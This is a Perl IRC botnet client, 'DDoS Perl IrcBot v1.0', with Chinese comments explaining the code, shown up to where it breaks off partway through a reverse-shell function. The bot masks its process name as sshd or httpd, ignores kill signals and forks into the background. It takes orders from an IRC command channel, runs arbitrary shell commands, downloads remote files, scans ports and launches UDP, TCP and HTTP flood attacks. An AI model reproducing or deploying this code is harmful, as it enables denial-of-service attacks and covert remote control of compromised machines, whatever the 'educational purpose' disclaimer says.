#!/usr/bin/perl

######################################################################################################################
######################################################################################################################
##  DDoS Perl IrcBot v1.0 / 2012 By #AccesDenied Security Team ## [ Help ] ###########################################
##      Stealth MultiFunctional IrcBot writen in Perl          #######################################################
##        Teste on every system with PERL instlled             ##  !u @system                                       ##
##                                                             ##  !u @version                                      ##
##     This is a free program used on your own risk.           ##  !u @channel                                      ##
##        Created for educational purpose only.                ##  !u @flood                                        ##
## I'm not responsible for the illegal use of this program.    ##  !u @utils                                        ##
######################################################################################################################
## [ Channel ] #################### [ Flood ] ################################## [ Utils ] ###########################
######################################################################################################################
##  !u @join <#channel>          ##  !u @udp1 <ip> <port> <time>              ##  !u @cback <ip> <port>             ##
##  !u @part <#channel>          ##  !u @udp2 <ip> <packet size> <time>       ##  !u @download <url+path> <file>     ##
##  !u !uejoin <#channel>        ##  !u @udp3 <ip> <port> <time>              ##  !u @portscan <ip>                 ##
##  !u !op <channel> <nick>      ##  !u @tcp <ip> <port> <packet size> <time> ##  !u @mail <subject> <sender>       ##
##  !u !deop <channel> <nick>    ##  !u @http <site> <time>                   ##           <recipient> <message>    ##
##  !u !voice <channel> <nick>   ##                                           ##  !u pwd;uname -a;id <for example>  ##
##  !u !devoice <channel> <nick> ##  !u @ctcpflood <nick>                     ##  !u @port <ip> <port>              ##
##  !u !nick <newnick>           ##  !u @msgflood <nick>                      ##  !u @dns <ip/host>                 ##
##  !u !msg <nick>               ##  !u @noticeflood <nick>                   ##                                    ##
##  !u !quit                     ##                                           ##                                    ##
##  !u !uaw                      ##                                           ##                                    ##
##  !u @die                      ##                                           ##                                    ##
##                               ##                                           ##                                    ##
######################################################################################################################
######################################################################################################################

#############################
##### [ Configuration ] #####
#############################

#随机进程名
my @rps = ("/usr/local/apache/bin/httpd -DSSL",
                   "/usr/sbin/httpd -k start -DSSL",
           "/usr/sbin/httpd",
                   "/usr/sbin/sshd -i",
                   "/usr/sbin/sshd",
               "/usr/sbin/sshd -D",
           "/usr/sbin/apache2 -k start",
               "/sbin/syslogd",
               "/sbin/klogd -c 1 -x -x",
                   "/usr/sbin/acpid",
                   "/usr/sbin/cron");
my $process = $rps[rand scalar @rps]; #随机选择一个进程名 scalar标量化 获取数组元素的个数 rand随机获取

my @rversion = ("\001VERSION - unknown command.\001",
                                "\001mIRC v5.91 K.Mardam-Bey\001",
                                "\001mIRC v6.2 Khaled Mardam-Bey\001",
                                "\001mIRC v6.03 Khaled Mardam-Bey\001",
                                "\001mIRC v6.14 Khaled Mardam-Bey\001",
                                "\001mIRC v6.15 Khaled Mardam-Bey\001",
                                "\001mIRC v6.16 Khaled Mardam-Bey\001",
                                "\001mIRC v6.17 Khaled Mardam-Bey\001",
                                "\001mIRC v6.21 Khaled Mardam-Bey\001",
                                "\001mIRC v6.31 Khaled Mardam-Bey\001",
                                "\001mIRC v7.15 Khaled Mardam-Bey\001");
my $vers = $rversion[rand scalar @rversion]; # 随机选择一个IRC版本号

my @rircname = ("abbore","ably","abyss","acrima","aerodream","afkdemon","ainthere","alberto","alexia","alexndra",
                                "alias","alikki","alphaa","alterego","alvin","ambra","amed","andjela","andreas","anja",
                                "anjing","anna","apeq","arntz","arskaz","as","asmodizz","asssa","athanas","aulis",
                                "aus","bar","bast","bedem","beeth","bella","birillo","bizio","blackhand","blacky",
                                "blietta","blondenor","blueangel","bluebus","bluey","bobi","bopoh","borre","boy","bram",
                                "brigitta","brio","brrrweg","brujah","caprcorn","carloto","catgirl","cathren","cemanmp","chainess",
                                "chaingone","chck","chriz","cigs","cintat","clarissa","clbiz","clex","cobe","cocker",
                                "coke","colin","conan","condoom","coop","coopers","corvonero","countzero","cracker","cread",
                                "crnaruka","cruizer","cubalibre","cure","custodes","dan","dangelo","danic","daniela","dario",
                                "darker","darknz","davide","daw","demigd","des","devastor","diabolik","dimkam","dital",
                                "djtt","dogzzz","dolfi","dolphin","dottmorte","dracon","dragon","drtte","dumbblnd","dusica",
                                "ebe","edgie","eggist","einaimou","elef","elly","emmi","encer","engerim","erixon",
                                "eurotrash","fairsight","fin","fireaway","fjortisch","floutti","fluffer","flum","forever","fqw",
                                "fra","freem","freew","freud","funny","furia","furunkuli","fwsmou","gad","gamppy",
                                "gerhard","ghostie","gili","girlie","giugno","gizmo","glidaren","gold","gomora","gracie",
                                "grave","graz","grron","gsund","gufoao","hali","hallas","hammer","harri","harry",
                                "hayes","hazor","herbiez","hlios","hoffi","honeii","hongkong","hug","iasv","ibanez",
                                "ibanz","ibar","igi","illusins","imp","inkworks","iplord","ivan","ja","jaffa",
                                "jaimeafk","james","jamezdin","janet","janne","jason","javagrl","jayc","jazz",
                                "jejborta","jester","jj","jn","jockey","joe","joelbitar","johannes","johndow","johnny",
                                "joni","jonni","jornx","joshua","jossumi","judy","juge","juha","juhas","julze",
                                "juutsu","kajman","kalca","kamileon","kardinal","kasandra","katarina","kaviee","kbee","ken",
                                "keung","kewin","khan","kikeli","kikii","kilroi","kiwi","klaara","kliimax","klimas",
                                "kode","kojv","koopal","kralj","krash","krista","kronos","ktx","kungen","kuppa",
                                "kurai","lala","lamour","latina","legend","lenisaway","lily","linda","lingyee","linux",
                                "lisa","lisha","litta","littleboy","liverpoo","liyen","liz","liza","lonely","lonelygal",
                                "lonewolf","lopez","lordie","lovebyte","lph","luarbiasa","lucignol","lullaby","lunatic","luny",
                                "lupo","mac","macesgl","madd","mailman","malkav","malr","mamakians","mamaw","manarimou",
                                "manarisou","maradona","marakana","marco","marillion","mark","mary","master","maurino","max",
                                "mcalcota","melanie","melinda","meph","mephisto","mg","mhj","mhz","mig","miina",
                                "mika","mikav","mike","mikemcgii","mikko","mikma","mimma","miss","moladmin","monikaw",
                                "monkeyboy","monroe","monstop","mooks","mordeshur","mpdike","mrbate","mrbeauty","mrblom","mrbx",
                                "mrjee","mro","mrtabizy","mrx","mrxx","msd","mu","muimui","musashi","musc",
                                "musce","musicgal","muti","myboy","mystr","mythic","mywife","nallllle","nanask","natalie",
                                "natborta","ncubus","neutrino","niceguy","nico","niklas","nimfa","nino","nurul","obiwanbip",
                                "ogre","olivia","omega","only","orac","orace","oranzzzzz","organza","ourlove","outworld",
                                "outzake","oxygn","paliadog","pazarac","permaloso","perroz","pessaar","phre","phreaky","pihkal",
                                "pinball","poesje","poison","poofie","popy","powerpc","pper","primera","primetime","proxyma",
                                "pshyche","psioncore","psiximou","psixisou","psychosis","psyidle","pszaah","puppetm","pzzzz",
                                "quattro","question","ra","ragio","ragnetto","raiden","raindance","raistln","ranu","raska",
                                "raul","raye","reartu","red","reflect","ribica","richard","rick","rigo","rikuta",
                                "rikuxr","rita","rix","rob","roku","ronaldo","ronwrl","roticanai","rugiada","ruthless",
                                "saalut","sammi","sand","satanins","schzsh","scorpin","sealink","sean","secret","serpentor",
                                "servant","sethi","sexbolek","sexyman","sharmm","shearer","shekel","shio","shortys","shred",
                                "sidewalk","sil","siren","skar","skill","skru","sky","skygun","skylink","slaktarn",
                                "slash","slgon","smarties","smck","snake","snike","snoopgirl","sodoma","sopocani","sorceress",
                                "spacebbl","spacedump","spanker","spermboy","spirtouli","srk","stazzz","steve","stinga","stj",
                                "stjf","studenica","stussy","suez","suhoj","sukun","sunsola","surfer","sutera","svearike",
                                "sweetii","sweetlady","sweklopi","swepilot","switch","syncphos","szern","takumura","tallaxlc","tampone",
                                "tarabas","tatano","tato","tennis","tenx","terence","terkukur","tero","thefox","thesint",
                                "timer","timewalk","tmhd","tnxfck","to","tomihki","tommy","topo","triumph","trustme",
                                "tungau","tupac","turbozzzz","turing","tvrdjava","tysn","unicron","uoff","uptimer","utopia",
                                "vader","vaismi","vajje","vanda","varjo","vass","vento","venusguy","vertie","viagara",
                                "vicious","vidxxx","virex","vodafone","vone","vrgnie","vuubeibe","wanderer","warrr","wasabboy",
                                "weebee","wellu","wendy","whiskey","willgood","wing","winny","wknight","wlly","wolfman",
                                "wow","wp","xarasou","xtreme","xxx","xzone","yakzr","yang","yashy","yasin",
                                "yenyen","ykbug","yogiebear","zai","zfstr","zinj","zizu","zvezda","zwimou","zwisou",
                                "zwsiew","zwsiewale");

my $ircname = $rircname[rand scalar @rircname]; #随机生成一个ircname


chop (my $realname = $rircname[rand scalar @rircname]); #随机生成一个realname 并去除最后一位字符\n

my $nick =$rircname[rand scalar @rircname]; #随机生成一个nickname

$server = 'xxx.xxx.xxx.xxx' unless $server; #服务器ip，如果$server不存在则默认
my $port = '6667';# 端口

my $linas_max='8'; #undefined
my $sleep='5'; # 间歇时间

my $homedir = "/tmp";#工作目录
my $version = 'gztest v1'; 

my @admins = ("root","root1","root2","root3","root4"); #数组@admin
my @hostauth = ("xxx.xxx.xxx.xxx"); #管理员ip
my @channels = ("#Perl"); #IRC频道

my $pacotes = 1;

$SIG{'INT'} = 'IGNORE';# 信号列表及其处理方式
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use Socket;
use IO::Socket;
use IO::Socket::INET;
use IO::Select;

chdir("$homedir");

$server="$ARGV[0]" if $ARGV[0]; #服务器地址从命令行参数中获得
$0="$process"."\0"x16; #进程名后填充16个字节0x00
my $pid=fork; #fork一个进程出来
exit if $pid; #如果没有申请到pid则退出脚本
die "Can't fork in background: $!" unless defined($pid);

our %irc_servers;#定义全局hash irc_server
our %DCC; #定义全局hash DDC
my $dcc_sel = new IO::Select->new();#建立socket对象
$sel_cliente = IO::Select->new();# 建立socket对象

sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
    print $IRC_cur_socket "$_[0]\n";
  }
}

#下载文件函数
sub getstore ($$) #$$当前perl解释器的ID
{
  my $url = shift; # shift @_
  my $file = shift; # shift @_
  $http_stream_out = 1;
  open(GET_OUTFILE, "> $file");# 写入文件
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}

#获取url参数
sub _get
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);  #下载
  } else {
    return undef;
  }
}

#读取文件
sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  $AGENT = "get-minimal";
  $VERSION = "20000118";
  $path =~ s/ /%20/g;

  require IO::Socket;
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                   PeerPort => $port,
                                   Proto   => 'tcp',
                                   Timeout  => 60) || return;
  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;

  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") {
      $b1 = $buf;
      $buf =~ s/.+?\015?\012\015?\012//s;
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
  }
  return undef unless defined($n);
  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/) {
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }

  return $buf;
}

#连接irc服务器函数
sub conectar {
  my $meunick = $_[0];
  my $server_con = $_[1];
  my $port_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server_con",
  PeerPort=>$port_con) or return(1); # 新建socket::INET连接
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);#
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} = "$server_con";
    $irc_servers{$IRC_cur_socket}{'port'} = "$port_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick"); #发送nick注册
    sendraw("USER $ircname ".$IRC_socket->sockhost." $server_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
      while (!(keys(%irc_servers))) {
	  conectar("$nick", "$server", "$port"); #尝试连接irc服务器
	  } 
      delete($irc_servers{''}) if (defined($irc_servers{''})); 
      my @ready = $sel_cliente->can_read(0);#等待回复
      next unless(@ready); #如果没有返回则持续监听
      foreach $fh (@ready) {
          $IRC_cur_socket = $fh;
          $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
          $nread = sysread($fh, $msg, 4096); #读取缓冲区信息
          if ($nread == 0) {
            $sel_cliente->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
          }
      @lines = split (/\n/, $msg);
      for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line=$line_temp.$line if ($line_temp);
            $line_temp='';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
            parse("$line");
            } else {
              if ($#lines == 0) {
                parse("$line");
              } elsif ($lines[$c] =~ /\r$/) {
                parse("$line");
              } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                parse("$line");
              } else {
                $line_temp = $line;
              }
            }
      }
    }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } 
  elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
        my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
        if ($args =~ /^\001VERSION\001$/) {
            notice("$pn", "".$vers."");
        }
        if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {    #判断当前用户权限
            if (grep {$_ =~ /^\Q$pn\E$/i } @admins ) {
                if ($onde eq "$meunick"){
                    shell("$pn", "$args");
                }
                if ($args =~ /^(\Q$meunick\E|\!u)\s+(.*)/){
                  my $natrix = $1;
                  my $arg = $2;
                  if ($arg =~ /^\!(.*)/) {
                    ircase("$pn","$onde","$1");
                  } elsif ($arg =~ /^\@(.*)/) {
                  $ondep = $onde;
                  $ondep = $pn if $onde eq $meunick;
                    bfunc("$ondep","$1");
                  } else {
                    shell("$onde", "$arg");
                  }
              }
            }
        }
      }
   elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
              if (lc($1) eq lc($meunick)) {
                  $meunick=$4;
                  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
              }
            } 
			
   elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
                nick("$meunick-".int rand(9999));
            } 
   elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
                $meunick = $2;
                $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
                $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
                foreach my $canal (@channels) {
                    sendraw("MODE $nick +x");
                    sendraw("JOIN $canal");
                    sendraw("PRIVMSG $canal : [This is a test script!]");
               }
            }
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
#创建子进程
  if (my $pid = fork) {
#等待子进程执行完毕
  waitpid($pid, 0);
  } else {
  if (fork) {
  exit;
  } else {
###########################
##### [ Help Module ] #####
###########################

#帮助命令(!u @help)
if ($funcarg =~ /^help/) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]======================= ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]DDoS PerlBot Main Help:  ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]======================= ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @1system              ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u version             ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u channel             ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u flood               ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u utils               ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]======================= ");
}

#获取系统信息(!u @system)
if ($funcarg =~ /^system/) {
        $uptime=`uptime`;
        $ownd=`pwd`;
        $id=`id`;
        $uname=`uname -srp`;
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]=================== ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]Bot Configuration:  ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]=================== ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]*Server       : [*]$server ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]*Port         : [*]$port ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]*Channels     : [*]@channels ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]*uname -a     : [*]$uname ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]*uptime       : [*]$uptime ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]*FakeProcess  : [*]$process ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]*ProcessPID   : [*]$$ ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]*ID           : [*]$id ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]*Own Dir      : [*]$ownd ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [System]=================== ");
}

#获取脚本版本(!u @version)
if ($funcarg =~ /^version/){
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Version]================================== ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Version]Bot Informations:                  ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Version]================================== ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Version]*Bot Version : [*]$version   ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Version]*Bot Creator : [*]DDoS             ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Version]*Bot Year    : [*]2012                ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Version]================================== ");
}

#flood攻击帮助菜单(!u @flood)
if ($funcarg =~ /^flood/) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]========================================= ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]DDoS PerlBot Flood Help: ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]========================================= ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1udp1 <ip> <port> <time>               ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1udp2 <ip> <packet size> <time>        ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1udp3 <ip> <port> <time>               ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1tcp <ip> <port> <packet size> <time>  ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1http <site> <time>                    ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1ctcpflood <nick>                      ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1msgflood <nick>                       ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1noticeflood <nick>                    ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]========================================= ");
}
#irc聊天功能命令(!u @channel)
if ($funcarg =~ /^channel/) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]============================= ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]DDoS PerlBot Channel Help:     ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]============================= ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1join <channel>            ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @@1part <channel>            ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u rejoin <channel>          ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u op <channel> <nick>       ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u deop <channel> <nick>     ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u voice <channel> <nick>    ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u devoice <channel> <nick>  ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u nick <newnick>            ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u msg <nick>                ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u quit                      ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u die                       ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]============================= ");
}

#主要功能(!u @utils)
if ($funcarg =~ /^utils/) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]================================================== ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]DDoS PerlBot Utils Help:                            ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]================================================== ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @1cback <ip> <port>                              ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @1download <url+path> <file>                     ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @1mail <subject> <sender> <recipient> <message>  ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @1dns <ip>                                       ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @1port <ip> <port>                               ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u @1portscan <ip>                                  ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]!u pwd (for example)                               ");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Help]================================================== ");
}

#########################
##### [ Functions ] #####
#########################
#功能具体实现

#结束进程
if ($funcarg =~ /^die/) {
        sendraw($IRC_cur_socket, "QUIT :".$1);
        $killd = "kill -9 ".fork;
        system (`$killd`);
}

############加入聊天室
if ($funcarg =~ /^join (.*)/) {
        sendraw($IRC_cur_socket, "JOIN ".$1);
}

if ($funcarg =~ /^part (.*)/) {
        sendraw($IRC_cur_socket, "PART ".$1);
}
###########端口扫描
if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my @portas=("1","7","9","14","20","21","22","23","25","53","80","88","110","112","113","137","143","145","222","333","405","443","444","445","512","587","616","666","993","995","1024","1025","1080","1144","1156","1222","1230","1337","1348","1628","1641","1720","1723","1763","1983","1984","1985","1987","1988","1990","1994","2005","2020","2121","2200","2222","2223","2345","2360","2500","2727","3130","3128","3137","3129","3303","3306","3333","3389","4000","4001","4471","4877","5252","5522","5553","5554","5642","5777","5800","5801","5900","5901","6062","6550","6522","6600","6622","6662","6665","6666","6667","6969","7000","7979","8008","8080","8081","8082","8181","8246","8443","8520","8787","8855","8880","8989","9855","9865","9997","9999","10000","10001","10010","10222","11170","11306","11444","12241","12312","14534","14568","15951","17272","19635","19906","19900","20000","21412","21443","21205","22022","30999","31336","31337","32768","33180","35651","36666","37998","41114","41215","44544","45055","45555","45678","51114","51247","51234","55066","55555","65114","65156","65120","65410","65500","65501","65523","65533");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl : [PortScan]Scanning for open ports on ".$1." started. ");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }
  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl : [PortScan]Open ports found: [*]@aberta ");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $printl : [PortScan]No open ports found. ");
  }
}

##############文件下载命令
if ($funcarg =~ /^download\s+(.*)\s+(.*)/) {
        getstore("$1", "$2");
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Download]Downloaded the file: [*]$2 from $1 ");
}

##############dns域名解析
if ($funcarg =~ /^dns\s+(.*)/){
        my $nsku = $1;
        $mydns = inet_ntoa(inet_aton($nsku));
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [DNS]Resolved: [*]$nsku to $mydns ");
}
##############端口手动探测
if ($funcarg=~ /^port\s+(.*?)\s+(.*)/ ) {
        my $hostip= "$1";
        my $portsc= "$2";
        my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 7);
        if ($scansock) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [PORT]Connection to $hostip9,$portsc ,is Accepted. ");
        }
        else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [PORT]Connection to $hostip9,$portsc ,is Refused. ");
        }
}
##############udp flood
if ($funcarg =~ /^udp1\s+(.*)\s+(\d+)\s+(\d+)/) {
    return unless $pacotes;
    socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
    my $alvo=inet_aton("$1");
    my $porta = "$2";
    my $dtime = "$3";
    my $pacote;
    my $pacotese;
        my $size = 0;
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl : [UDP-1 DDOS]Attacking ".$1." On Port ".$porta." for ".$dtime." seconds. ");
        while (($pacota == "1") && ($pacotes == "1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
            $pacote = $size ? $size : int(rand(1024-64)+64) ;
            $porta = int(rand 65000) +1 if ($porta == "0");
            #send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo));
            send(Tr0x, pack("a$pacote","Tr0x"), 0, pack_sockaddr_in($porta, $alvo));
            }
    sendraw($IRC_cur_socket, "PRIVMSG $printl : [UDP-1 DDOS]Attack for".$1." finished in".$dtime." seconds. ");
}
##############
if ($funcarg =~ /^udp2\s+(.*)\s+(\d+)\s+(\d+)/) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [UDP-2 DDOS]Attacking".$1." with".$2." Kb Packets for".$3." seconds. ");
        my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
        $dtime = 1 if $dtime == 0;
        my %bytes;
        $bytes{igmp} = $2 * $pacotes{igmp};
        $bytes{icmp} = $2 * $pacotes{icmp};
        $bytes{o} = $2 * $pacotes{o};
        $bytes{udp} = $2 * $pacotes{udp};
        $bytes{tcp} = $2 * $pacotes{tcp};
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [UDP-2 DDOS]Results".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in".$dtime." seconds to".$1.". ");
}
##############
if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
    return unless $pacotes;
    socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
    my $alvo=inet_aton("$1");
    my $porta = "$2";
    my $dtime = "$3";
    my $pacote;
    my $pacotese;
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl : [UDP-3 DDOS]Attacking".$1." On Port".$porta." for".$dtime." seconds. ");
        while (($pacota == "1") && ($pacotes == "1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
            $pacote= $rand x $rand x $rand;
            $porta = int(rand 65000) +1 if ($porta == "0");
            send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == "1");
            }
    sendraw($IRC_cur_socket, "PRIVMSG $printl : [UDP-3 DDOS]Results".$pacotese." Kb in".$dtime." seconds to".$1.". ");
}
##############

############## tcp flood 
if ($funcarg =~ /^tcp\s+(.*)\s+(\d+)\s+(\d+)/) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [TCP DDOS]Attacking".$1.":".$2." for".$3." seconds. ");
        my $itime = time;
        my ($cur_time);
        $cur_time = time - $itime;
        while ($3>$cur_time){
        $cur_time = time - $itime;
        &tcpflooder("$1","$2","$3");
}
        sendraw($IRC_cur_socket,"PRIVMSG $printl : [TCP DDOS]Attack ended on: [*]".$1.":".$2.". ");
}
############## http ddos 
if ($funcarg =~ /^http\s+(.*)\s+(\d+)/) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[HTTP DDOS]Attacking".$1." on port 80 for".$2." seconds. ");
        my $itime = time;
        my ($cur_time);
        $cur_time = time - $itime;
        while ($2>$cur_time){
        $cur_time = time - $itime;
        my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
        print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
        close($socket);
}
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [HTTP DDOS]Attacking ended on: [*]".$1.". ");
}
############## shell
if ($funcarg =~ /^cback\s+(.*)\s+(\d+)/) {
        my $host = "$1";
        my $port = "$2";
        my $proto = getprotobyname('tcp');
        my $iaddr = inet_aton($host);
        my $paddr = sockaddr_in($port, $iaddr);
        my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
        $shell = "cmd.exe";
}
